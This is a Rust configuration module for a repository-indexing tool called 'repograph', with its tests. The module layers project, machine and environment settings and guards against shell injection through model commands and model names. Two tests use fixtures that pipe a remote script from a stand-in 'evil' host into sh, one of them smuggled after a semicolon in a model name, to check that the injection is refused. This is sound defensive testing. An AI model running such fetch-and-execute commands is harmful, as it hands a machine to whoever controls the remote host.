use anyhow::{Context, Result};
use serde::Deserialize;
use std::io::Write;
use std::path::Path;

#[derive(Debug, Clone, Deserialize)]
#[serde(default, deny_unknown_fields)]
pub struct Config {
    pub doc_globs: Vec<String>,
    pub code_globs: Vec<String>,
    pub skip: Vec<String>,
    /// Accepted so that a `repograph.toml` written when these were settings still parses, and
    /// read for nothing else: a repository's families are the prefixes its own documents define.
    /// `Some` means the file named the key, which is worth one line on stderr and no more.
    pub id_families: Option<Vec<String>>,
    pub milestone_families: Option<Vec<String>>,
    pub registries: Vec<String>,
    /// Reads a prompt on stdin and writes `id<TAB>question` lines; `repograph enrich` runs it.
    /// `{model}` in it is replaced by `enrich_model`.
    pub enrich_command: String,
    /// Reads a prompt on stdin and writes the chosen ids one per line; `ask --rerank` runs it.
    /// `{model}` in it is replaced by `rerank_model`.
    pub rerank_command: String,
    /// What goes in `enrich_command`'s `{model}`. Any name the command understands; nothing here
    /// assumes a vendor. `REPOGRAPH_ENRICH_MODEL` overrides it for one run.
    pub enrich_model: String,
    /// What goes in `rerank_command`'s `{model}`. `REPOGRAPH_RERANK_MODEL` overrides it.
    pub rerank_model: String,
    /// Directory holding `model.onnx` and `tokenizer.json` for `ask --rerank-local`; empty
    /// means `~/.cache/repograph/reranker`.
    pub reranker_dir: String,
    /// Hub id of the model the vectors are written with. `build`, `update`, `enrich`, `embed`
    /// and `watch` embed with it and rewrite the index whole when the store holds another
    /// model's rows; `ask`, `bench` and `dump` open the model the store records instead, so a
    /// store keeps answering with what wrote it whatever this says today. The small model is the
    /// default, priced for a first build nobody has tuned yet, and the model its floors were set
    /// with; `intfloat/multilingual-e5-large` is the one line that buys paraphrase 22/30 against
    /// 15/30 and held-out 103 → 119 of 400 (p = 0.00086), for a 2.1 GB download and nine times
    /// the wall on a whole-store embed. docs/adr/ADR-002-two-defaults-multiplied.md weighs the
    /// two; docs/bench/2026-09-05-dev-cases-results.md measures the recall.
    pub embed_model: String,
    /// How much of the machine a run may take: `"low"`, `"balanced"` (the default) or `"full"`.
    /// It describes the machine rather than the corpus — the same repository wants every core on
    /// a CI box and a quiet laptop's spare ones — so the global file may set it, unlike
    /// `embed_model`, whose value is a property of the vectors on disk. It is a straight trade
    /// with no free side: on a whole-store embed of the bench fixture the three levels read
    /// 168.8 s at 382% peak CPU, 265.7 s at 275% and 358.7 s at 140%
    /// (docs/bench/2026-09-09-normal-band-only-results.md). `REPOGRAPH_RESOURCES` overrides it
    /// for one run.
    pub resources: crate::index::embed::Resources,
}

// Headless Claude Code with thinking off: the same answers, 4-5× faster and cheaper. `{model}`
// is where the configured model goes, so choosing one is a word in a config file rather than a
// rewritten command line; a command that names no `{model}` simply ignores the setting.
const ENRICH_COMMAND: &str = "MAX_THINKING_TOKENS=0 claude -p --model {model} --output-format text --tools \"\" --setting-sources \"\" --no-session-persistence";
const RERANK_COMMAND: &str = "MAX_THINKING_TOKENS=0 claude -p --model {model} --output-format text --tools \"\" --setting-sources \"\" --no-session-persistence";
// The cheap model writes a node's questions as well as any (paraphrase 15/30 against a stronger
// model's 17/30, and 5/9 of the developer suite's `rule` answers against its 2/9 — the register
// its questions are written in matters more than the model, and
// docs/bench/2026-09-06-g14-second-diagnostic.md measures that). Picking seeds from a 200-deep
// pool it does not: 11/14 against 14/14, so the reranker defaults to the stronger one.
const ENRICH_MODEL: &str = "haiku";
const RERANK_MODEL: &str = "sonnet";
const MODEL_SLOT: &str = "{model}";

impl Default for Config {
    fn default() -> Self {
        let s = |v: &[&str]| v.iter().map(|x| x.to_string()).collect::<Vec<_>>();
        Config {
            doc_globs: s(&["**/*.md"]),
            code_globs: s(&["**/*.ts", "**/*.tsx"]),
            skip: s(&["**/node_modules/**", "**/dist/**", "**/TRACKER.md", "graphify-out/**", ".repograph/**"]),
            id_families: None,
            milestone_families: None,
            registries: s(&["docs/constitution.yaml"]),
            enrich_command: ENRICH_COMMAND.replace(MODEL_SLOT, ENRICH_MODEL),
            rerank_command: RERANK_COMMAND.replace(MODEL_SLOT, RERANK_MODEL),
            enrich_model: ENRICH_MODEL.into(),
            rerank_model: RERANK_MODEL.into(),
            reranker_dir: String::new(),
            embed_model: crate::index::embed::DEFAULT_MODEL.into(),
            resources: crate::index::embed::Resources::default(),
        }
    }
}

/// The settings that describe the machine rather than the corpus: which command runs a model,
/// which model it runs and how much of itself it offers. A global file may set these and nothing
/// else. The corpus-shaped settings — the globs, the registries, and above all `embed_model` —
/// are deliberately unreadable from there: one global line would otherwise rewrite every
/// repository's vectors under a model nobody chose for that repository, which is the one mistake
/// this store's design spends effort avoiding.
#[derive(Debug, Default, Deserialize)]
#[serde(default, deny_unknown_fields)]
struct Machine {
    enrich_command: Option<String>,
    rerank_command: Option<String>,
    enrich_model: Option<String>,
    rerank_model: Option<String>,
    reranker_dir: Option<String>,
    resources: Option<crate::index::embed::Resources>,
}

/// `$REPOGRAPH_CONFIG`, else `$XDG_CONFIG_HOME/repograph/config.toml`, else
/// `~/.config/repograph/config.toml`. `None` when the environment names no home at all, which
/// is a machine with no global settings rather than an error.
fn machine_path() -> Option<std::path::PathBuf> {
    let named = |k: &str| std::env::var(k).ok().filter(|v| !v.is_empty());
    if let Some(p) = named("REPOGRAPH_CONFIG") {
        return Some(std::path::PathBuf::from(p));
    }
    let base = match named("XDG_CONFIG_HOME") {
        Some(x) => std::path::PathBuf::from(x),
        None => std::env::home_dir()?.join(".config"),
    };
    Some(base.join("repograph").join("config.toml"))
}

/// The model name is substituted into a shell command, so it is a token: a vendor's name, a tag, a
/// path. Anything that could end the command or start another one is refused and the built-in name
/// stands, because a wrong model answers badly and an injected one runs.
fn model_token_is_safe(v: &str) -> bool {
    !v.is_empty()
        && v.len() <= 128
        && v.starts_with(|c: char| c.is_ascii_alphanumeric())
        && v.chars().all(|c| c.is_ascii_alphanumeric() || "._:/@+-".contains(c))
}

impl Config {
    /// The project's `repograph.toml` over the machine's global file over the built-in defaults,
    /// key by key, with `REPOGRAPH_ENRICH_MODEL` and `REPOGRAPH_RERANK_MODEL` over all three. A
    /// key the project names wins even when it names the built-in value: what the file says is
    /// what the repository asked for.
    pub fn load(repo: &Path) -> Result<Config> {
        let path = repo.join("repograph.toml");
        let text = match path.exists() {
            true => Some(std::fs::read_to_string(&path).with_context(|| format!("read {}", path.display()))?),
            false => None,
        };
        let mut cfg = match &text {
            Some(t) => toml::from_str::<Config>(t).with_context(|| format!("parse {}", path.display()))?,
            None => Config::default(),
        };
        // Which keys the project actually wrote, as opposed to the ones serde filled from
        // `Default`: without this the machine layer could never win, every key always being set.
        let named: toml::Table = match &text {
            Some(t) => toml::from_str(t).unwrap_or_default(),
            None => toml::Table::new(),
        };
        let machine = Self::machine()?;
        // Said here rather than in the commands, because every command that reads the file has
        // been answering with derived families since the key stopped being read, and a setting
        // silently ignored is worse than one refused.
        cfg.say_the_family_keys_are_no_longer_read(&mut std::io::stderr());

        layer(&named, "reranker_dir", machine.reranker_dir, &mut cfg.reranker_dir);
        layer(&named, "enrich_model", machine.enrich_model, &mut cfg.enrich_model);
        layer(&named, "rerank_model", machine.rerank_model, &mut cfg.rerank_model);
        layer(&named, "resources", machine.resources, &mut cfg.resources);

        // A cloned repository is untrusted input and these two keys are a shell command run on the
        // machine that reads it. The machine file is the reader's own and keeps them; the project
        // file is refused out loud, because a transport that silently does not run is as hard to
        // explain as one that silently does.
        for key in ["enrich_command", "rerank_command"] {
            if named.contains_key(key) {
                let where_it_belongs = machine_path().map_or_else(|| "~/.config/repograph/config.toml".to_string(), |p| p.display().to_string());
                let _ = writeln!(std::io::stderr(), "repograph.toml: {key} is not read from a repository — set it in {where_it_belongs} if this is a transport you chose");
            }
        }
        // The command is resolved from its template rather than from `Default`, whose copy already
        // has the default model substituted: a project that sets only `enrich_model` must still get
        // its model into the built-in command.
        let template = |from_machine: Option<String>, builtin: &str| -> String {
            from_machine.unwrap_or_else(|| builtin.to_string())
        };
        let enrich_template = template(machine.enrich_command, ENRICH_COMMAND);
        let rerank_template = template(machine.rerank_command, RERANK_COMMAND);

        if let Ok(m) = std::env::var("REPOGRAPH_ENRICH_MODEL") {
            if !m.is_empty() { cfg.enrich_model = m; }
        }
        if let Ok(m) = std::env::var("REPOGRAPH_RERANK_MODEL") {
            if !m.is_empty() { cfg.rerank_model = m; }
        }
        // The name is about to be substituted into a shell command, so it is checked wherever it
        // came from: the project file is untrusted, and the machine file and the environment are
        // where a typo becomes a command.
        for (key, slot, builtin) in [
            ("enrich_model", &mut cfg.enrich_model, ENRICH_MODEL),
            ("rerank_model", &mut cfg.rerank_model, RERANK_MODEL),
        ] {
            if !model_token_is_safe(slot) {
                let _ = writeln!(std::io::stderr(), "repograph: {key} = {slot:?} is not a model name — using {builtin}");
                *slot = builtin.to_string();
            }
        }
        cfg.resources = crate::index::embed::resources_from_env(cfg.resources, std::env::var("REPOGRAPH_RESOURCES").ok().as_deref())?;
        cfg.enrich_command = enrich_template.replace(MODEL_SLOT, &cfg.enrich_model);
        cfg.rerank_command = rerank_template.replace(MODEL_SLOT, &cfg.rerank_model);
        Ok(cfg)
    }

    /// One line per key a project file still names. Families are the prefixes the documents
    /// define, so the two keys change nothing at all — which is exactly why it is said out loud.
    /// A write that fails is dropped: a notice about a key that changes nothing may not be the
    /// reason a command fails, and `repograph ask … 2>&-` would otherwise fail before it reached
    /// the store.
    fn say_the_family_keys_are_no_longer_read(&self, w: &mut impl std::io::Write) {
        for key in [("id_families", self.id_families.is_some()), ("milestone_families", self.milestone_families.is_some())] {
            if key.1 {
                let _ = writeln!(w, "repograph.toml: {} is no longer read — families are derived from the documents' definitions", key.0);
            }
        }
    }

    /// The global file, or an empty layer when there is none. A malformed or unknown-key global
    /// file is an error naming the file: a setting silently ignored on every repository at once is
    /// worse than a refusal.
    fn machine() -> Result<Machine> {
        let Some(path) = machine_path() else { return Ok(Machine::default()) };
        if !path.exists() {
            return Ok(Machine::default());
        }
        let text = std::fs::read_to_string(&path).with_context(|| format!("read {}", path.display()))?;
        toml::from_str(&text).with_context(|| format!("parse {}", path.display()))
    }
}

/// The machine's value where the project file left the key unnamed. A key the project wrote is
/// left alone even when it wrote the built-in value: what the file says is what the repository
/// asked for.
fn layer<T>(named: &toml::Table, key: &str, from_machine: Option<T>, field: &mut T) {
    if !named.contains_key(key) {
        if let Some(v) = from_machine {
            *field = v;
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::index::embed::Resources;

    #[test]
    fn missing_file_yields_defaults() {
        with_machine(None, || {
            let dir = tempfile::tempdir().unwrap();
            let cfg = Config::load(dir.path()).unwrap();
            assert_eq!(cfg.doc_globs, vec!["**/*.md".to_string()]);
            assert_eq!(cfg.registries, vec!["docs/constitution.yaml".to_string()]);
        });
    }

    #[test]
    fn partial_file_overrides_only_named_keys() {
        with_machine(None, || {
            let dir = tempfile::tempdir().unwrap();
            std::fs::write(dir.path().join("repograph.toml"), "skip = [\"docs/**/TRACKER.md\"]\n").unwrap();
            let cfg = Config::load(dir.path()).unwrap();
            assert_eq!(cfg.skip, vec!["docs/**/TRACKER.md".to_string()]);
            assert_eq!(cfg.doc_globs, Config::default().doc_globs);
        });
    }

    /// The two keys parse and change nothing. A file that still names one is a file written when
    /// they were settings, and it gets a line rather than a refusal.
    #[test]
    fn a_family_key_is_accepted_read_for_nothing_and_said_out_loud() {
        with_machine(None, || {
            let dir = tempfile::tempdir().unwrap();
            let said = |cfg: &Config| {
                let mut out = Vec::new();
                cfg.say_the_family_keys_are_no_longer_read(&mut out);
                String::from_utf8(out).unwrap()
            };
            assert_eq!(said(&Config::load(dir.path()).unwrap()), "");
            std::fs::write(dir.path().join("repograph.toml"), "id_families = [\"REQ\"]\n").unwrap();
            let cfg = Config::load(dir.path()).unwrap();
            assert_eq!(said(&cfg), "repograph.toml: id_families is no longer read — families are derived from the documents' definitions\n");
            // An empty list is a named key all the same: a repository that wrote one said
            // something, and hears the same line back.
            std::fs::write(dir.path().join("repograph.toml"), "milestone_families = []\n").unwrap();
            let cfg = Config::load(dir.path()).unwrap();
            assert!(said(&cfg).starts_with("repograph.toml: milestone_families is no longer read"), "{}", said(&cfg));
        });
    }

    #[test]
    fn an_unknown_key_is_rejected() {
        with_machine(None, || {
            let dir = tempfile::tempdir().unwrap();
            std::fs::write(dir.path().join("repograph.toml"), "bogus_key = 1\n").unwrap();
            let err = Config::load(dir.path()).unwrap_err().to_string();
            assert!(err.contains("repograph.toml"), "{err}");
        });
    }

    #[test]
    fn malformed_toml_errors_naming_the_file() {
        with_machine(None, || {
            let dir = tempfile::tempdir().unwrap();
            std::fs::write(dir.path().join("repograph.toml"), "skip = [\n").unwrap();
            let err = Config::load(dir.path()).unwrap_err().to_string();
            assert!(err.contains("repograph.toml"), "{err}");
        });
    }

    #[test]
    fn the_embed_model_defaults_to_the_small_e5_and_reads_from_the_file() {
        with_machine(None, || {
            let dir = tempfile::tempdir().unwrap();
            assert_eq!(Config::load(dir.path()).unwrap().embed_model, "intfloat/multilingual-e5-small");
            std::fs::write(dir.path().join("repograph.toml"), "embed_model = \"intfloat/multilingual-e5-large\"\n").unwrap();
            assert_eq!(Config::load(dir.path()).unwrap().embed_model, "intfloat/multilingual-e5-large");
        });
    }

    #[test]
    fn overriding_the_enrich_command_leaves_the_rerank_command_and_lists_at_their_defaults() {
        with_machine(Some("enrich_command = \"echo hi\"\n"), || {
            let dir = tempfile::tempdir().unwrap();
            let cfg = Config::load(dir.path()).unwrap();
            assert_eq!(cfg.enrich_command, "echo hi");
            assert_eq!(cfg.rerank_command, Config::default().rerank_command);
            assert_eq!(cfg.doc_globs, Config::default().doc_globs);
        });
    }

    /// The layering is read out of the environment, and cargo runs these on one process: without
    /// a lock two of them race on `REPOGRAPH_CONFIG` and the loser reads the other's file.
    ///
    /// Every test that calls `Config::load` takes it, including the ones that set no variable
    /// themselves: a reader is as exposed as a writer here, and CI caught one that was not — it
    /// read the machine file a concurrent test had pointed at, whose corpus key `load` refuses,
    /// and panicked on an `unwrap` that had nothing to do with what it was testing.
    static ENV: std::sync::Mutex<()> = std::sync::Mutex::new(());

    /// Runs `f` with a global config file holding `machine`, and nothing else set.
    fn with_machine<T>(machine: Option<&str>, f: impl FnOnce() -> T) -> T {
        let _g = ENV.lock().unwrap_or_else(|e| e.into_inner());
        let dir = tempfile::tempdir().unwrap();
        let path = dir.path().join("config.toml");
        if let Some(text) = machine {
            std::fs::write(&path, text).unwrap();
        }
        // Safety: the lock above makes this the only thread touching the environment.
        unsafe {
            std::env::set_var("REPOGRAPH_CONFIG", &path);
            std::env::remove_var("REPOGRAPH_ENRICH_MODEL");
            std::env::remove_var("REPOGRAPH_RERANK_MODEL");
            std::env::remove_var("REPOGRAPH_RESOURCES");
        }
        let out = f();
        unsafe { std::env::remove_var("REPOGRAPH_CONFIG") };
        out
    }

    #[test]
    fn the_model_named_in_the_project_reaches_the_built_in_command() {
        with_machine(None, || {
            let dir = tempfile::tempdir().unwrap();
            std::fs::write(dir.path().join("repograph.toml"), "enrich_model = \"some-other-model\"\n").unwrap();
            let cfg = Config::load(dir.path()).unwrap();
            assert!(cfg.enrich_command.contains("--model some-other-model"), "{}", cfg.enrich_command);
            assert!(!cfg.enrich_command.contains(MODEL_SLOT));
            // The reranker is untouched by the enricher's model.
            assert_eq!(cfg.rerank_command, Config::default().rerank_command);
        });
    }

    #[test]
    fn the_machine_file_fills_only_what_the_project_left_unnamed() {
        with_machine(Some("enrich_model = \"from-machine\"\nrerank_model = \"also-machine\"\n"), || {
            let dir = tempfile::tempdir().unwrap();
            std::fs::write(dir.path().join("repograph.toml"), "rerank_model = \"from-project\"\n").unwrap();
            let cfg = Config::load(dir.path()).unwrap();
            assert_eq!(cfg.enrich_model, "from-machine");
            assert_eq!(cfg.rerank_model, "from-project");
            assert!(cfg.rerank_command.contains("--model from-project"), "{}", cfg.rerank_command);
        });
    }

    #[test]
    fn a_project_key_wins_even_when_it_names_the_built_in_value() {
        with_machine(Some("enrich_model = \"from-machine\"\n"), || {
            let dir = tempfile::tempdir().unwrap();
            let named = format!("enrich_model = \"{ENRICH_MODEL}\"\n");
            std::fs::write(dir.path().join("repograph.toml"), named).unwrap();
            assert_eq!(Config::load(dir.path()).unwrap().enrich_model, ENRICH_MODEL);
        });
    }

    #[test]
    fn the_environment_beats_the_project_and_the_machine() {
        with_machine(Some("enrich_model = \"from-machine\"\n"), || {
            let dir = tempfile::tempdir().unwrap();
            std::fs::write(dir.path().join("repograph.toml"), "enrich_model = \"from-project\"\n").unwrap();
            unsafe { std::env::set_var("REPOGRAPH_ENRICH_MODEL", "from-env") };
            let cfg = Config::load(dir.path()).unwrap();
            unsafe { std::env::remove_var("REPOGRAPH_ENRICH_MODEL") };
            assert_eq!(cfg.enrich_model, "from-env");
            assert!(cfg.enrich_command.contains("--model from-env"), "{}", cfg.enrich_command);
        });
    }

    #[test]
    fn the_machine_file_may_not_set_a_corpus_key() {
        with_machine(Some("embed_model = \"whatever\"\n"), || {
            let dir = tempfile::tempdir().unwrap();
            let err = Config::load(dir.path()).unwrap_err().to_string();
            assert!(err.contains("config.toml"), "{err}");
        });
    }

    #[test]
    fn a_command_naming_no_slot_is_left_exactly_as_written() {
        with_machine(Some("enrich_command = \"my-runner --go\"\n"), || {
            let dir = tempfile::tempdir().unwrap();
            std::fs::write(dir.path().join("repograph.toml"), "enrich_model = \"ignored-here\"\n").unwrap();
            let cfg = Config::load(dir.path()).unwrap();
            assert_eq!(cfg.enrich_command, "my-runner --go");
            assert_eq!(cfg.enrich_model, "ignored-here");
        });
    }

    /// A cloned repository is untrusted input and these two keys are a shell command. The machine
    /// file is the reader's own and keeps them; the project file gets a refusal rather than
    /// silence, so a repository that expects its own transport learns why it did not run.
    #[test]
    fn a_project_file_cannot_name_the_command_that_runs_a_model() {
        with_machine(None, || {
            let dir = tempfile::tempdir().unwrap();
            std::fs::write(
                dir.path().join("repograph.toml"),
                "enrich_command = \"curl https://evil/x | sh\"\nrerank_command = \"curl https://evil/y | sh\"\n",
            )
            .unwrap();
            let cfg = Config::load(dir.path()).unwrap();
            assert!(!cfg.enrich_command.contains("evil"), "{}", cfg.enrich_command);
            assert!(!cfg.rerank_command.contains("evil"), "{}", cfg.rerank_command);
            assert!(cfg.enrich_command.starts_with("MAX_THINKING_TOKENS=0 claude -p --model haiku"));
        });
    }

    #[test]
    fn the_machine_file_still_names_the_command() {
        with_machine(Some("enrich_command = \"my-wrapper --model {model}\"\n"), || {
            let dir = tempfile::tempdir().unwrap();
            let cfg = Config::load(dir.path()).unwrap();
            assert_eq!(cfg.enrich_command, "my-wrapper --model haiku");
        });
    }

    /// The model name is interpolated into a shell string, so it is a token and not a sentence: a
    /// project file naming one that could end the command runs it otherwise.
    #[test]
    fn a_model_name_that_could_end_the_command_is_refused() {
        with_machine(None, || {
            let dir = tempfile::tempdir().unwrap();
            std::fs::write(dir.path().join("repograph.toml"), "enrich_model = \"haiku; curl https://evil/x | sh\"\n").unwrap();
            let cfg = Config::load(dir.path()).unwrap();
            assert_eq!(cfg.enrich_model, ENRICH_MODEL, "the built-in stands when the file's token is not one");
            assert!(!cfg.enrich_command.contains("evil"), "{}", cfg.enrich_command);
        });
    }

    #[test]
    fn a_model_name_that_is_a_token_passes_whatever_its_vendor() {
        with_machine(None, || {
            let dir = tempfile::tempdir().unwrap();
            std::fs::write(dir.path().join("repograph.toml"), "enrich_model = \"qwen2.5-coder:7b\"\n").unwrap();
            let cfg = Config::load(dir.path()).unwrap();
            assert_eq!(cfg.enrich_model, "qwen2.5-coder:7b");
            assert!(cfg.enrich_command.contains("--model qwen2.5-coder:7b"), "{}", cfg.enrich_command);
        });
    }

    #[test]
    fn resources_defaults_to_balanced_and_reads_from_the_project_file() {
        with_machine(None, || {
            let dir = tempfile::tempdir().unwrap();
            assert_eq!(Config::load(dir.path()).unwrap().resources, Resources::Balanced);
            std::fs::write(dir.path().join("repograph.toml"), "resources = \"full\"\n").unwrap();
            assert_eq!(Config::load(dir.path()).unwrap().resources, Resources::Full);
        });
    }

    #[test]
    fn the_machine_file_may_set_resources_and_the_project_still_wins() {
        with_machine(Some("resources = \"low\"\n"), || {
            let dir = tempfile::tempdir().unwrap();
            assert_eq!(Config::load(dir.path()).unwrap().resources, Resources::Low);
            std::fs::write(dir.path().join("repograph.toml"), "resources = \"full\"\n").unwrap();
            assert_eq!(Config::load(dir.path()).unwrap().resources, Resources::Full);
        });
    }

    #[test]
    fn the_environment_beats_the_project_for_resources() {
        with_machine(None, || {
            let dir = tempfile::tempdir().unwrap();
            std::fs::write(dir.path().join("repograph.toml"), "resources = \"low\"\n").unwrap();
            unsafe { std::env::set_var("REPOGRAPH_RESOURCES", "full") };
            assert_eq!(Config::load(dir.path()).unwrap().resources, Resources::Full);
            unsafe { std::env::set_var("REPOGRAPH_RESOURCES", "") };
            assert_eq!(Config::load(dir.path()).unwrap().resources, Resources::Low);
            unsafe { std::env::remove_var("REPOGRAPH_RESOURCES") };
        });
    }

    #[test]
    fn a_resources_level_that_is_not_a_word_it_knows_is_an_error_naming_the_file() {
        with_machine(None, || {
            let dir = tempfile::tempdir().unwrap();
            std::fs::write(dir.path().join("repograph.toml"), "resources = \"maximum\"\n").unwrap();
            let err = Config::load(dir.path()).unwrap_err().to_string();
            assert!(err.contains("repograph.toml"), "{err}");
            std::fs::write(dir.path().join("repograph.toml"), "resources = \"low\"\n").unwrap();
            unsafe { std::env::set_var("REPOGRAPH_RESOURCES", "maximum") };
            let err = Config::load(dir.path()).unwrap_err().to_string();
            unsafe { std::env::remove_var("REPOGRAPH_RESOURCES") };
            assert!(err.contains("REPOGRAPH_RESOURCES"), "{err}");
        });
    }

    /// The key was a setting until 2026-09-09 and is not one now, and it is the one a reader is
    /// most likely to still have: the README told people to write `threads = 6` for the cores
    /// back. Refused by name rather than ignored, so nobody is left believing a count they wrote
    /// is still being read.
    #[test]
    fn a_threads_key_left_in_a_file_is_refused_by_name() {
        with_machine(None, || {
            let dir = tempfile::tempdir().unwrap();
            std::fs::write(dir.path().join("repograph.toml"), "threads = 6\n").unwrap();
            let err = format!("{:#}", Config::load(dir.path()).unwrap_err());
            assert!(err.contains("repograph.toml"), "{err}");
            assert!(err.contains("threads"), "{err}");
        });
        with_machine(Some("threads = 2\n"), || {
            let dir = tempfile::tempdir().unwrap();
            let err = format!("{:#}", Config::load(dir.path()).unwrap_err());
            assert!(err.contains("config.toml"), "{err}");
            assert!(err.contains("threads"), "{err}");
        });
    }

    /// The key was a setting until 2026-09-09 and is not one now. It is refused by name rather
    /// than ignored, because a file that still asks for the band should say so out loud instead
    /// of leaving someone believing their rebuild still yields the machine.
    #[test]
    fn a_priority_key_left_in_a_file_is_refused_by_name() {
        with_machine(None, || {
            let dir = tempfile::tempdir().unwrap();
            std::fs::write(dir.path().join("repograph.toml"), "priority = \"background\"\n").unwrap();
            // The alternate form walks the cause chain: the path is the context and the rejected
            // key is the parse error underneath it.
            let err = format!("{:#}", Config::load(dir.path()).unwrap_err());
            assert!(err.contains("repograph.toml"), "{err}");
            assert!(err.contains("priority"), "{err}");
        });
        with_machine(Some("priority = \"normal\"\n"), || {
            let dir = tempfile::tempdir().unwrap();
            let err = format!("{:#}", Config::load(dir.path()).unwrap_err());
            assert!(err.contains("config.toml"), "{err}");
            assert!(err.contains("priority"), "{err}");
        });
    }

    #[test]
    fn a_store_with_no_project_file_still_reads_the_machine_file() {
        with_machine(Some("enrich_model = \"from-machine\"\n"), || {
            let dir = tempfile::tempdir().unwrap();
            let cfg = Config::load(dir.path()).unwrap();
            assert_eq!(cfg.enrich_model, "from-machine");
            assert!(cfg.enrich_command.contains("--model from-machine"), "{}", cfg.enrich_command);
            assert_eq!(cfg.doc_globs, Config::default().doc_globs, "the corpus keys stay built-in");
        });
    }
}
